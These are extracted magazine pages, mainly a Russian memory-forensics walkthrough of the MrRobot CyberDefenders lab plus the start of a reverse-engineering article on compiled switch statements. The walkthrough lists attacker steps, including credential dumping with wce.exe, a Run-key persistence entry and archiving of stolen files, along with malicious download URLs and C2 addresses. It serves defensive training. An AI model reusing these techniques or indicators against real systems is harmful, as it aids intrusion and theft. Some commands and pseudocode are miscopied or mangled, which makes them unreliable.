   Microsoft пока не выпустила патч для исправления уязвимости в MSDT,
за что подвергается справедливой критике. В любом случае, как известно,
на многих компьютерах обновления отключены, а об установке их вручную
часто речи и вовсе не заходит. Поэтому, думается, пользователи еще долго
будут удивленно вскрикивать «опа, шинанай!», когда Follina в очередной раз
внезапно запустит в их системе что‑нибудь вредоносное.
ВЗЛОМ
УРОКИ
ФОРЕНЗИКИ

РАССЛЕДУЕМ
КИБЕРИНЦИДЕНТ
MRROBOT





        rayhunt454
   grigadan454@gmail.com





В этой  статье мы проведем  расследование  инцидента
на  примере  лабораторной работы MrRobot  с  ресурса
CyberDefenders. Мы научимся извлекать основные артефак‐
ты из образов оперативной памяти Windows и восстановим
процесс атаки.


Сценарий в задании такой: сотрудник компании сообщил, что ему пришло
электронное письмо с обновлением безопасности, он запустил вложение
и после этого компьютер начал вести себя странно. Группа реагирования
на инциденты получила дампы оперативной памяти с подозрительных машин.
Наша задача — исследовать их, найти то самое письмо, выявить загруженные
вредоносные программы и методы бокового перемещения по сети.
   По результатам решения кейса необходимо ответить на ряд вопросов,
но я покажу сам процесс решения и не буду озвучивать ответы. Ты можешь
повторить все  самостоятельно,  чтобы  лучше  разобраться и  закрепить
материал.
   Итак, загрузим файл архива с артефактами и приступим к их исследова‐
нию.


ИСПОЛЬЗУЕМЫЕ УТИЛИТЫ
 1. Volatility Framework 2.6.1 — инструмент, реализованный на Python вер‐
   сии 2 и предназначенный для извлечения артефактов из образцов энер‐
   гозависимой памяти.
 2. Bulk extractor — инструмент для извлечения структурированной информа‐
   ции, к примеру адресов электронной почты, URL, доменов.
 3. YARA Editor — программа для тестирования и создания правил YARA.


ИСПОЛЬЗУЕМЫЕ ПЛАГИНЫ VOLATILITY2 ДЛЯ ИЗВЛЕЧЕНИЯ
ДАННЫХ
 1. Imageinfo — плагин для определения операционной системы, пакета
   обновлений и аппаратной архитектуры исследуемого образа.
 2. Pstree — позволяет просматривать список процессов в виде дерева.
 3. Handles — показывает открытые дескрипторы к файлам, разделам реес‐
    тра, мьютексам, именованным каналам, спрятанным в процессах. Также
    позволяет отобразить дескрипторы для конкретного процесса и конкрет‐
   ного типа объекта.
 4. Consoles — плагин для поиска команд, которые злоумышленники ввели
   в окне cmd.exe. Основное его преимущество — плагин не только показы‐
   вает  введенные  злоумышленниками  команды,  но  и  собирает  весь
   экранный буфер (ввод и вывод).
 5. Memdump — извлекает все резидентные страницы памяти в процессе.
 6. Filescan —  плагин  для  поиска  объектов FILE_OBJECT  в  памяти
   с помощью сканирования тегов пула. Найдет все открытые файлы.
 7. Dumpfiles — извлекает кешированные файлы из образа памяти.
 8. Netscan — ищет сетевые артефакты в 32- и 64-разрядных дампах памяти.
   Плагин находит конечные точки TCP, UDP, локальные и удаленные IP-адре‐
    са.
 9. Printkey — ищет значения в указанном разделе реестра Windows.
10. Userassist —  позволяет  получить  информацию  из  ключа  реестра
   UserAssist.
11. Mftparser — сканирует записи главной таблицы файлов (MFT) в памяти
   и выводит информацию о временных метках файлов.
12. Autoruns — подключаемый  плагин, который ищет  точки сохранения
   исполняемых  файлов в  системе. Для его  подключения необходимо
   добавить плагин в каталог plugins инструмента Volatility.
13. Malfind — плагин для поиска скрытого или внедренного в память процес‐
   сов кода.

Распаковываем архив с заданием и получаем три файла, которые содержат
образы памяти скомпрометированных хостов: Target1, Target2 и POS. Файлы
имеют расширение .vmss, то есть представляют собой моментальные сним‐
ки виртуальной машины VMware. Если Volatility не может извлечь артефакты
из этих файлов, можно воспользоваться плагином raw2dmp, который пре‐
образует дамп памяти  приостановленной  виртуальной машины VMware
в формат, пригодный для анализа. Также можно воспользоваться инструмен‐
том vmss2core.
    Исследование образов оперативной памяти можно разделить на два эта‐
па: восстановление действий пользователя и поиск признаков вредоносной
активности. На первом этапе необходимо проанализировать запущенные
процессы,  открытые  документы,  восстановить  историю  браузера.  Эта
информация поможет определить время компрометации системы, а также
выяснить, какие действия пользователя привели к инциденту. А проанализи‐
ровав активность злоумышленника, нужно найти использованные вредонос‐
ные модули, способ их закрепления в системе, а также обнаружить методы
бокового перемещения по сети организации.


ИССЛЕДОВАНИЕ ХОСТА TARGET1
Получим первичную информацию об исследуемой машине, выясним профиль
операционной системы, сетевой адрес и имя хоста.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 imageinfo`





              Информация о профиле операционной системы

В    ключе    реестра   SYSTEM\ControlSet001\Control\ComputerName\
ComputerName содержится информация об имени компьютера.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 printkey -K  "ControlSet001\Control\C
omputerName\ComputerName"





                      Имя компьютера

Имя компьютера — FRONT-DESK-PC.
   Получим сетевой адрес хоста: в ключе реестра SYSTEM\ControlSet001\
Services\Tcpip\Parameters\Interfaces   содержатся   идентификаторы
сетевых адаптеров, в одном из которых хранится информация о сети.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 printkey -K "ControlSet001\Services\Tcpip\
Parameters\Interfaces\{9C3710A4-77FE-48CB-911B-742A81DE38BA}"





                             IP-адрес хоста

Профиль скомпрометированной машины — Win7SP1x86_23418, IP-адрес —
10.1.1.20, имя хоста — FRONT-DESK-PC.
   Начнем  восстанавливать  действия  пользователя в  системе. Первым
делом получим информацию о запущенных процессах и сохраним ее в файл
для удобства анализа.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 pstree >  pstree.txt





                      Дерево запущенных процессов

Мы видим запущенный процесс OUTLOOK.EXE с идентификатором 3196. В его
адресном пространстве содержится информация об электронных сообщени‐
ях и открытых файлах. Получим переписку авторизованного в Outlook поль‐
зователя. Для этого выгрузим все файлы данного процесса и проанализи‐
руем их: в дескрипторе открытого процесса с идентификатором 3196 найдем
все объекты FILE.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 handles -p 3196 -t FILE >  handles_3196.
txt



                   Открытые файлы процесса OUTLOOK.exe

Мы обнаружили файл с расширением .ost, который содержит кешированные
(сохраненные в памяти системы) сообщения электронного почтового ящика
пользователя.  Попробуем  восстановить  этот  файл,  используя  плагин
dumpfiles, но сначала нам необходимо узнать физический адрес данного
файла в памяти. Запустим плагин filescan, найдем интересующий нас файл
и получим его физический адрес.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 handles -p 3196 -t FILE >  filescan.txt


                    Физический адрес файла outlook2.ost

Адрес файла outlook2.ost — 0x000000003ecec2b0. Теперь можно восста‐
новить сам файл. В параметре -Q плагина dumpfiles указываем адрес файла,
который нужно выгрузить.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003ecec2b0 -D
dumpfiles/

Я попробовал восстановить все файлы контейнера outlook, но они оказались
пустыми. Воспользуемся другим методом выгрузки сообщений. Для этого
получим дамп адресного пространства процесса OUTLOOK.EXE с помощью
плагина memdump.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 memdump -p 3196 -D ./

Мы получили дамп адресного пространства, попробуем в нем найти сооб‐
щения. Откроем полученный файл в шестнадцатеричном редакторе и найдем
строку From, а также Content-Type.





                     Обнаруженный заголовок письма



                    Содержимое электронного письма

Проанализируем  его  заголовок:  нас  интересуют  поля  Subject,  From
и Received.


             INFO

                        Как анализировать заголовки электронных писем,
                             рассказывается в одной из наших статей.


Письмо пришло от пользователя th3wh1t3r0s3@gmail.com и имело тему
Обновите ваш VPN клиент. Поле Received характеризует адрес отправите‐
ля, а также показывает, через какие узлы сообщение прошло.
   Находим первое поле Received и узнаем, что сообщение отправлено с IP-
адреса 10.114.2.82. Как видно из содержимого, там присутствует ссылка
http://180.76[.]254[.]120/AnyConnectInstaller.exe для загрузки фай‐
ла AnyConnectInstaller.exe.
   Выгрузим этот файл из образа памяти.


               Физический адрес файла AnyConnectInstaller.exe


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003df1cf00  -D c69-
Grrcon2015/target1/dumpfiles

Мы получили файл file.None.0x85d1c6c0.img. Возьмем MD5-сумму и про‐
верим на VirusTotal, чтобы выяснить первичную информацию о файле.
   Затем проверим полученный модуль с помощью YARA-правил.





                        Детект выгруженного вредоноса

Полученный вредоносный модуль относится к семейству XtremeRAT.
   Анализируем дальше. Теперь нам нужно получить список исполняемых
файлов, запущенных пользователем. Для этого необходимо проанализи‐
ровать информацию из  ключа userassist  ветки  реестра NTUSER.DAT.
Для этого воспользуемся плагином userassist.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 userassist > c69-Grrcon2015/target1/
userassist





                        Информация из userassist

Как видно из рисунка, в 11:31:27 09.10.2015 UTC пользователь запустил
загруженный в почтовый  клиент файл AnyConnectInstaller.exe. После
запуска вредоноса злоумышленник получил доступ к компьютеру.
   Найдем методы закрепления на скомпрометированной машине. Для этого
воспользуемся плагином autoruns.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 autoruns > c69-Grrcon2015/target1/autoruns



           Автозапуск исполняемого файла AnyConnectInstaller.exe

Чтобы закрепиться и обеспечить работу после перезагрузки компьютера,
запускают исполняемый файл AnyConnectInstaller.exe, для этого в ключе
реестра SOFTWARE\Microsoft\Windows\CurrentVersion\Run было добав‐
лено значение MrRobot. Проведем небольшой анализ файла, для чего заг‐
рузим его в IDA Pro.





                            Участок кода вредоноса

Вредоносный   файл   использует   знакомые   нам   функции   WinAPI
CreateProcessA, GetThreadContext, WriteProcessMemory.  Применяется
техника ProcessHollowing для загрузки кода в созданный процесс. Поведен‐
ческий анализ из информации на VirusTotal показывает, что вредонос создает
процесс с названием IEXPLORE.EXE.




                   Информация о созданном процессе

Найдем этот процесс в дереве процессов.


                     Информация о процессе iexplore

Вредоносный файл создал процесс iexplore.exe с идентификатором 2996,
далее методом ProcessHollowing загрузил исполняемый код в этот про‐
цесс. Для анализа дальнейших действий злоумышленника выгрузим дамп
процесса с идентификатором 2996.
   Найдем уникальное значение вредоноса в системе (Mutex). В Windows
есть объект ядра Mutant, который позволяет программам синхронизировать‐
ся  между собой.  Вредоносные  файлы  часто  используют  именованный
мьютекс для того, чтобы предотвратить повторный запуск в системе.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 handles -p 2996 -t MUTANT





              Поиск созданного мьютекса процесса iexplore.exe

Чтобы  предотвратить  повторный  запуск,  вредоносный  модуль  создал
мьютекс  fsociety0.dat.  Теперь  получим  NTLM-хеш   пользователя
Administrator, для чего воспользуемся плагином hashdump.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 hashdump




                NTLM-хеш пользователя Administrator

Восстановим дальнейшие действия злоумышленника. Для этого восполь‐
зуемся плагином consoles.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 consoles >  c69-Grrcon2015/target1/
consoles





                         Результат вывода утилиты consoles

Злоумышленник загрузил три основные утилиты в каталог C:\Windows\Temp:
wce.exe — редактор учетных данных Windows, nbtscan.exe — программа
для   сканирования   локальной   сети   на   наличие   Windows-машин,
getlsasrvaddre.exe позволяет получить список сессий залогиненных поль‐
зователей Windows и извлечь LM/NT-хеши.
  С  помощью   утилиты  wce.exe   злоумышленник  получил  пароль
flagadmin@1234 пользователя Administrator.





                 Получение пароля пользователя Administrator

Далее злоумышленник залогинился в системе от имени администратора
и запустил командную оболочку.




              Запуск командной строки от имени администратора

Найдем дату создания утилиты nbtscan.exe. Для этого проанализируем
MFT-таблицу с использованием плагина mftparser.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 mftparser | grep nbtscan.exe



                             Анализ MFT-таблицы

Дата создания  утилиты: 2015-10-09  10:45:12  UTC. Теперь посмотрим
на содержимое каталога C:\Windows\Temp. Там среди прочего обнаружи‐
вается файл nbs.txt.


                             Поиск файла nbs.txt

Получим его содержимое, воспользовавшись утилитой dumpfiles: адрес
файла в памяти 0x000000003fdb7808.


python2 vol.py -f c69-Grrcon2015/target1/Target1-1dd8701f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fdb7808 -D c69-
Grrcon2015/target1/dumpfiles




                        Содержимое файла nbs.txt

Итак, мы выяснили, что IP-адрес первой машины — 10.1.1.2. Проанализи‐
руем сетевую активность хоста, для этого воспользуемся плагином netscan.





                             Сетевая активность

Вредоносный процесс iexplore.exe с идентификатором 2996 взаимодей‐
ствует с управляющим сервером по адресу 180.76.254.120:22. Далее зло‐
умышленники подключились к хосту 10.1.1.21 по протоколу RDP. Чтобы
управлять скомпрометированной машиной, атакующие установили на нее
TeamViewer.exe.
   На данном этапе мы проанализировали оперативную память хоста Target1,
нашли точку входа в сеть организации. Используя фишинговое сообщение,
содержащее заголовок письма Udate your VPN  Client, злоумышленник
th3wh1t3r0s3@gmail.com  отправил  вредоносную  ссылку.  Пользователь
машины Target1 загрузил исполняемый файл AnyConnectInstaller.exe,
после запуска которого атакующий установил контроль над компьютером.
Затем он загрузил дополнительные утилиты и повысил привилегии в системе.
Наконец, злоумышленник подключился к хосту 10.1.1.21 по протоколу RDP,
используя пароль flagadmin@1234 пользователя Administrator.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
   УРОКИ ФОРЕНЗИКИ
           РАССЛЕДУЕМ КИБЕРИНЦИДЕНТ MRROBOT





ИССЛЕДОВАНИЕ МАШИНЫ TARGET2
Получим первичную информацию об исследуемом образе.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
imageinfo





                 Информация об операционной системе


python2 vol.py -f /mnt/c/Users/DonNod/Downloads/c69-Grrcon2015/
target2/target2-6186fe9f.vmss --profile=Win7SP1x86_23418 printkey -K
"ControlSet001\Control\ComputerName\ComputerName"





                      Имя компьютера


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 printkey -K ControlSet001\Services\T cpip\P
arameters\Interfaces{e29ac6c2-7037-11de-816d-806e6f6e6963}





                             IP-адрес хоста

Профиль операционной системы — Win7SP1x86_23418, IP-адрес хоста —
10.1.1.21, имя компьютера — GIDEON-PC. Теперь восстановим последова‐
тельность действий злоумышленника на скомпрометированном компьютере.
Для начала получим информацию из консоли.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 consoles >  c69-Grrcon2015/target2/
consoles





                         Вывод плагина consoles

Злоумышленник загрузил утилиту wce.exe и получил пароли пользователей
в системе. Посмотрим, что хранится в файле w.tmp. Для этого выгрузим его
так же, как выгружали для хоста Target1.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 filescan >  c69-Grrcon2015/target2/
filescan

Адрес файла w.tmp в исследуемом образе — 0x000000003fcf2798.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fcf2798 -D c69-
Grrcon2015/target2/dumpfiles




                        Содержимое файла w.tmp

Мы определили пароль пользователя gideon — t76fRJhs.
   Далее атакующий примонтировал системный диск контроллера домена \\
10.1.1.2\c$, используя пароль пользователя Administrator. Скопировал
программу архиватора rar.exe и создал на примонтированном диске папку
crownjewels.
   После этого злоумышленник заархивировал все файлы с расширением .
txt на диске и задал пароль от архива 123qwe!@#. Архив получил имя
crownjewlez.rar. Так как на исследуемом хосте архив не хранится и он
открывался только из командной строки, то информацию о сжатых файлах
можно поискать в памяти процесса. Получим дамп процесса и найдем в нем
все файлы с расширением .txt.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 pstree >  c69-Grrcon2015/target2/pstree



                           Дерево процессов

Сдампим адресное пространство процесса с идентификатором 3048.


python2 vol.py -f /mnt/c/Users/DonNod/Downloads/c69-Grrcon2015/
target2/target2-6186fe9f.vmss --profile=Win7SP1x86_23418 memdump -p
3048 -D /mnt/c/Users/DonNod/Downloads/c69-Grrcon2015/target2/

Выведем строки в полученном файле, но помним, что они в 16-битной
кодировке.


strings -e l 3048.dmp | grep -i 3048.dmp





        Обнаруженные файлы с расширением txt в дампе процесса

Проанализируем Tasks Shedulers. Найдем файлы tasks и выгрузим их.


                     Обнаруженный файл задачи At1

Адрес файла At1 — 0x000000003fc399b8.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fc399b8 -D c69-
Grrcon2015/target2/dumpfiles





                         Содержимое задачи At1

С помощью планировщика задач злоумышленник запустил скрипт 1.bat. Выг‐
рузим его, адрес файла в памяти — 0x000000003f427e50.


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003f427e50 -D c69-
Grrcon2015/target2/dumpfiles




                        Содержимое файла 1.bat

Скрипт 1.bat запускает утилиту wce.exe.
  Мы  проанализировали образ операционной системы на компьютере
Target2, восстановили действия злоумышленника. После компрометации сис‐
темы выгрузили файлы с расширением .txt на контроллере домена 10.1.1.
2, сохранили в запароленный архив, а также получили пароль пользователя
gideon.


АНАЛИЗ ХОСТА POS
Получим первичную информацию об исследуемой системе.


python2 vol.py -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss imageinfo





                     Профиль исследуемого образа


python2 vol.py -f c69-Grrcon2015/target2/target2-6186fe9f.vmss
--profile=Win7SP1x86_23418 printkey -K "ControlSet001\Services\Tcpip\
Parameters\Interfaces{e29ac6c2-7037-11de-816d-806e6f6e6963}"





                             IP-адрес хоста


python2 vol.py -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss --profile
=Win7SP1x86_23418 printkey -K  "ControlSet001\Control\ComputerName\C
omputerName"





                      Имя компьютера

Профиль исследуемого образа — Windows7SP1x86_23418, IP-адрес хоста —
10.1.1.10, имя компьютера — POS-01-PC.
   Получим  информацию обо  всех  запущенных  процессах  и  сетевой
активности.


python2 vol.py  -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss
--profile=Win7SP1x86_23418 pstree > c69-Grrcon2015/pos01/pstree



                          Процесс iexplore.exe

Находим процесс iexplore.exe с идентификатором 3208. Запустим плагин
malfind для поиска внедренного в адресное пространство процессов кода.


python2 vol.py  -f /mnt/c/Users/Forensics/Downloads/c69-Grrcon2015/
pos01/POS-01-c4e8f786.vmss --profile=Win7SP1x86_23418 malfind > /mnt/
c/Users/Forensics/Downloads/c69-Grrcon2015/pos01/malfind





                           Работа утилиты malfind

Из рисунка выше видно, что в процессе iexplore.exe с идентификатором
3208 обнаружена область памяти с защитой на запись, чтение и выполнение,
а также виден заголовок MZ (magic byte исполняемого файла). Мы на верном
пути. Попробуем выгрузить этот код с помощью плагина malfind и найдем
первичную информацию о вредоносе.


python2 vol.py -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss --profile
=Win7SP1x86_23418 malfind -p 3208 -D c69-Grrcon2015/pos01/

Выясним          MD5-хеш             полученного              файла:
491e1a4b51a09d234c9356822cf521a7 — и найдем его на VirusTotal.
   Данный модуль относится к семейству вредоносов Dexter.
   Найдем сетевое взаимодействие с управляющим сервером.


python2 vol.py  -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss
--profile=Win7SP1x86_2 3418 netscan > c69-Grrcon2015/pos01/netscan


              Сетевое взаимодействие процесса iexplore.exe

Вредоносный процесс установил соединение с управляющим сервером,
имеющим IP-адрес 54.84.237.92, по порту 80.
   Давай получим дамп адресного пространства процесса с идентифика‐
тором 3208 и вытащим все URL-адреса, для чего будем использовать утилиту
bulk_extractor.


python2 vol.py -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss --profile
=Win7SP1x86_23418 memdump -p 3208 -D ./

Мы получили файл 3208.dmp. Запустим утилиту bulk_extractor.


bulk_extractor 3208.dmp -o bulk_ex

В каталоге bulk_ex хранится вся извлеченная структурированная информа‐
ция, полученная из файла 3208.dmp. В файле url_histograms содержатся
все домены, а также число обращений к ним.


                        Загрузка вредоносного модуля

Модуль загружался с адреса http://54.84.237.92/allsafe_update.exe,
оригинальное имя файла — allsafe_update.exe. Также для поиска URL
в файле 3208.dmp можно  воспользоваться регулярным выражением /(
https?:\/\/)?([\w\.-]+)([\/\w \.-]*)/ и плагином yarascan.


python2 vol.py -f c69-Grrcon2015/pos01/POS-01-c4e8f786.vmss --profile
=Win7SP1x86_23418 yarascan -Y  “/(https?:\/\/) ?([\w\. -]+)([\/\w \. -]*
) /” -p 3208

Попробуем найти все файлы с расширением .exe в адресном пространстве
дампа процесса. Откроем файл в hex-редакторе.





                 Обнаруженные файлы с расширением exe

Специфичное   имя   исполняемого   файла   для   Allsafecybersec —
allsafe_protector.exe. Мы исследовали образ оперативной памяти хоста
POS, обнаружили вредоносный процесс с идентификатором 3208, выявили
сетевую активность с управляющим сервером 54.84.237.92. Загруженный
модуль относится к семейству вредоносных программ Dexter.


ВЫВОДЫ
Итак, мы восстановили действия злоумышленников, проанализировав обра‐
зы системной памяти Windows. С помощью фишингового сообщения, содер‐
жащего ссылку на обновления VPN-клиента, пользователь хоста загрузил
вредоносный файл и запустил его. На машину установился вредонос семей‐
ства XtremeRAT, с его помощью злоумышленники управляли скомпромети‐
рованной машиной.
   Далее   атакующие   получили   пароль   пользователя   front-desk
и Administrator. Для закрепления в системе использовалась ветка реестра
SOFTWARE\Microsoft\Windows\CurrentVersion\Run.  Компрометация  сис‐
темы произошла в 11:31:27 09.10.2015 UTC. С помощью учетной записи
Administrator злоумышленник получил доступ к хостам GIDEON-PC и POS-
01-PC. На компьютере GIDEON-PC атакующий примонтировал системный диск
контроллера домена 10.1.1.2\$c и выгрузил три файла с расширением .
txt. Далее атакующий получил доступ к компьютеру POS-01-PC и загрузил
на него малварь семейства Dexter.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex-
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

РАЗБИРАЕМ
САМОДЕЯТЕЛЬНОСТЬ
КОМПИЛЯТОРОВ
                                                            Юрий ЯзевПРИ ТРАНСЛЯЦИИ                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчикОПЕРАТОРА ВЫБОРА
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





В этой статье мы изучим оператор выбора switch. Давай
разберемся, какие формы он может принять в двоичном
коде, как разные компиляторы транслируют его и как его
найти в дизассемблированном коде по характерным приз‐
накам.


Фундаментальные основы хакерства
Пятнадцать лет назад эпический труд Криса Касперски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего исследова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
   Ссылки на другие статьи из этого цикла ищи на странице автора.



ИЩЕМ ОПЕРАТОРЫ SWITCH — CASE — BREAK В БИНАРНОМ КОДЕ
Для улучшения читабельности программ в язык C был введен оператор мно‐
жественного выбора — switch. В Delphi с той же самой задачей справляется
оператор CASE, более гибкий, чем его C-аналог, но об их различиях мы
поговорим позднее.
   Легко показать, что switch эквивалентен такой конструкции:


        IF (a == x ) THEN оператор                1                 1
      ELSE IF (a == X ) THEN оператор«                2                 2
        IF (a == X ) THEN оператор                 2                 2
        IF (a == X ) THEN оператор                 2                 2
      ELSE ... оператор по умолчанию                »
Если изобразить это ветвление в виде логического дерева, то образуется
характерная «косичка».





                 Трансляция оператора switch в общем случае

Казалось бы, идентифицировать switch никакого труда не составит — даже
не строя дерева, невозможно не обратить внимание на длинную цепочку
гнезд, проверяющих истинность условия равенства некоторой переменной
с серией непосредственных значений (сравнения переменной с другой
переменной оператор switch не допускает).
   Однако в реальной жизни все происходит совсем не так. Компиляторы
(даже неоптимизирующие) транслируют switch в настоящий «мясной рулет»,
доверху нашпигованный  всевозможными  операциями отношений. Давай
откомпилируем следующий код компилятором Microsoft Visual C++ 2022:


#include <stdio.h>


int main()
{
    int a = 0x666;


    switch (a)
    {
    case 0:
        printf("a == 0");
        break;
    case 1:
        printf("a == 1");
        break;
    case 2:
        printf("a == 2");
        break;
    case 0x666:
        printf("a == 666h");
        break;
    default:
        printf("Default");
    }
}





                     Вывод приложения switch_cases

Теперь посмотрим в IDA на результат дизассемблирования.





  Дерево распустило ветки во все стороны. Можно сделать однозначный
  вывод: в дизассемблируемой программе присутствует оператор мно‐
  жественного выбора switch-case


main            proc near ; CODE XREF: __scrt_common_main_seh+107↓p
                          ; DATA XREF: .pdata:0000000140004018↓o
; Объявляем две локальные переменные,
; но почему две, если в исходном коде объявлена только одна?
var_18          = dword ptr -18h
var_14          = dword ptr -14h
; Резервируем место для локальных переменных
                sub     rsp, 38h
; Инициализируем локальные переменные:
; var_14 присваиваем значение 0х666, следовательно, это переменная a
                mov     [rsp+38h+var_14], 666h
                mov     eax, [rsp+38h+var_14]

Переменной var_18 присваиваем это же значение. Обрати внимание: ее
создает оператор switch для собственных нужд. Значит, мы определили,
для чего в программе объявлена вторая локальная переменная! Она нужна
для хранения первоначального значения. Таким образом, даже если зна‐
чение сравниваемой переменной var_14 в каком‑то ответвлении CASE будет
изменено, это не  повлияет на  результат выборов,  поскольку значение
переменной var_18 не поменяется!


              mov     [rsp+38h+var_18], eax


; Сравниваем значение var_18 с нулем
                cmp     [rsp+38h+var_18], 0
; Если сравнение успешно, переходим в блок кода, выводящий в консоль
"a == 0"
; Этот код получен трансляцией ветки case 0: printf("a == 0");
; Иначе продолжаем выполнение
                jz      short loc_140001115
; Сравниваем значение var_18 с 1
                cmp     [rsp+38h+var_18], 1
; В случае успеха прыгаем внутрь блока кода для вывода "a == 1"
; Этот код получен трансляцией ветки case 1: printf("a == 1");
; Иначе продолжаем выполнение
                jz      short loc_140001123
; Сравниваем значение var_18 с 2
                cmp     [rsp+38h+var_18], 2
; В случае равенства выводим "a == 2"
; Этот код получен трансляцией ветки case 2: printf("a == 2");
; Иначе продолжаем выполнение
                jz      short loc_140001131
; Сравниваем var_18 и 0x666
                cmp     [rsp+38h+var_18], 666h
; Если равно, выводим "a == 666h"
; Этот код получен трансляцией ветки case 0x666: printf("a == 666h");
                jz      short loc_14000113F

Если мы досюда добрались, значит, ни одно условие не сработало, поэтому
выполняем дефолтное действие: делаем безусловный переход в блок кода
для вывода строчки Default.
   Этот код получен трансляцией ветки default: printf("Default");:


              jmp     short loc_14000114D


; ------------------------------------------------
loc_140001115:                          ; CODE XREF: main+19↑j
; printf("a == 0");
                lea     rcx, _Format    ; "a == 0"
                call    printf

А  вот  этот  безусловный  переход, выносящий  управление  за  пределы
switch — в конец программы, есть оператор break, находящийся в конце
каждой ветки. Если бы его не было, то начали бы выполняться все остальные
ветки case, независимо от того, к какому значению var_18 они принадлежат!


              jmp     short loc_140001159 ; break


; ------------------------------------------------
loc_140001123:                          ; CODE XREF: main+20↑j
; printf("a == 1");
                lea     rcx, aA1        ; "a == 1"
                call    printf
                jmp     short loc_140001159 ; break
; ------------------------------------------------
loc_140001131:                          ; CODE XREF: main+27↑j
; printf("a == 2");
                lea     rcx, aA2        ; "a == 2"
                call    printf
                jmp     short loc_140001159 ; break
; ------------------------------------------------
loc_14000113F:                          ; CODE XREF: main+31↑j
; printf("a == 666h");
                lea     rcx, aA666h     ; "a == 666h"
                call    printf
                jmp     short loc_140001159 ; break
; ------------------------------------------------
loc_14000114D:                          ; CODE XREF: main+33↑j
; printf("Default");
                lea     rcx, aDefault   ; "Default"
                call    printf
loc_140001159: ; Конец SWITCH           ; CODE XREF: main+41↑j
                                        ; main+4F↑j ...
; Возвращаем 0
                xor     eax, eax
; Восстанавливаем стек
                add     rsp, 38h
                retn
main            endp

Выглядит довольно прямолинейно. Дизассемблерный листинг можно условно
разделить на две части: первая часть — сам оператор выбора, откуда каждое
условие передает управление во вторую часть — конкретную ветку, соответс‐
твующую этому условию.
  Для сравнения взглянем, какой код построит C++Builder 10 на основе этой
же программы:


              public main
main            proc near ; DATA XREF: __acrtused+29↑o
; Как много локальных переменных!
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = qword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
; Открываем кадр стека
                push    rbp
; Резервируем место для локальных переменных
                sub     rsp, 60h
; В RBP сохраняем указатель на дно стека
                lea     rbp, [rsp+60h]
; Инициализируем локальные переменные:
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; var_14 присваиваем значение 0х666, следовательно, это переменная a
                mov     [rbp+var_14], 666h
